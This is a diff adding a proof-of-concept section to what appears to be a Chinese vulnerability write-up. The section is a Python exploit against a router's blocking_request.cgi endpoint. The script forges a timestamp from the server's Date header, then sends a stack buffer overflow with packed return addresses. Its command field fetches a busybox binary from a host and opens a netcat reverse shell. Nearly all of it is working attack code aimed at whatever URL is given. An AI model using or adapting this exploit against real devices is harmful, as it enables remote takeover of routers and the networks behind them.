@@ -72,3 +72,115 @@ atol(1639469133aaaaaaa.....)返回内容为1639469133,所以只需要在计算�
 
 # 漏洞演示
   [![Watch the video](https://raw.github.com/GabLeRoux/WebMole/master/ressources/WebMole_Youtube_Video.png)](https://youtu.be/9rpNKSVQtFM)
+  
+# POC 
+<sup> 
+
+
+  
+  
+    #coding=utf-8
+    from pwn import *
+    import re
+    import time
+    import requests
+    import urlparse
+    import urllib3
+    urllib3.disable_warnings()
+    import sys
+
+    def rematch(strTmp):
+        tm_year = strTmp[0][2]
+        tm_month = strTmp[0][1]
+        tm_day = strTmp[0][0]
+        tm_hour = strTmp[0][3]
+        tm_min = strTmp[0][4]
+        tm_sec = strTmp[0][5]
+        if tm_month == 'Jan':
+            tm_month = '01'
+        if tm_month == 'Feb':
+            tm_month = '02'
+        if tm_month == 'Mar':
+            tm_month = '03'
+        if tm_month == 'Apr ':
+            tm_month = '04'
+        if tm_month == 'May':
+            tm_month = '05'
+        if tm_month == 'Jun':
+            tm_month = '06'
+        if tm_month == 'Jul':
+            tm_month = '07'
+        if tm_month == 'Aug':
+            tm_month = '08'
+        if tm_month == 'Sept':
+            tm_month = '09'
+        if tm_month == 'Oct':
+            tm_month = '10'
+        if tm_month == 'Nov':
+            tm_month = '11'
+        if tm_month == 'Dec':
+            tm_month = '12'
+        tm_hour = int(tm_hour) + 8
+        time_tmp = '{}-{}-{} {}:{}:{}'.format(tm_year, tm_month, tm_day, tm_hour, tm_min, tm_sec)
+        print(time_tmp)
+        ts = time.strptime(time_tmp, "%Y-%m-%d %H:%M:%S")
+        timeStamp= int(time.mktime(ts))
+        return timeStamp
+
+
+    def getTime(url):
+        scheme =  urlparse.urlparse(url).scheme
+        hostname = urlparse.urlparse(url).hostname
+        header={
+            'Host': hostname,
+            'Cache-Control': 'max-age=0',
+            'Upgrade-Insecure-Requests': '1',
+            'Origin': scheme+'://'+hostname,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Referer': scheme+'://'+hostname,
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept-Language': 'zh-CN,zh;q=0.9',
+            'Connection':'close'
+        }
+        data1 ={
+            'CName': '',
+            'mac': '',
+            'interval': '',
+            'timestap': '',
+        }
+        url = url+'/blocking_request.cgi'
+        ret = requests.post(url = url ,
+                      headers = header,
+                      data = data1,
+                      verify=False)
+        format_time =''
+        for key, value in (ret.headers).items():
+            if 'Date' in key:
+                format_time = value
+        tmp = re.findall(r', (.*?) (.*?) (.*?) (.*?):(.*?):(.*?) GMT',format_time)
+        timeStap = rematch(tmp) + 3600
+        timeStapStr = str(timeStap)
+        print(timeStapStr)
+        data2 ={
+            'CName': 'cd /tmp/home/root;wget http://192.168.2.177:8080/busybox-armv6l;chmod 777 *;./busybox-armv6l nc 192.168.2.177:1234 -e /bin/ash',
+            'mac': '',
+            'interval': 'a'*12+p32(1)+'a'*16+p32(0x0000EFA8),
+            'timestap': timeStapStr +'a'*4740+p32(0x0006FE35),
+
+        }
+        ret = requests.post(url = url ,
+                      headers = header,
+                      data = data2,
+                      verify=False,)
+        print('End')
+
+
+    if __name__ == '__main__':
+        url = sys.argv[1]
+        getTime(url)
+
+
+
+</sup>
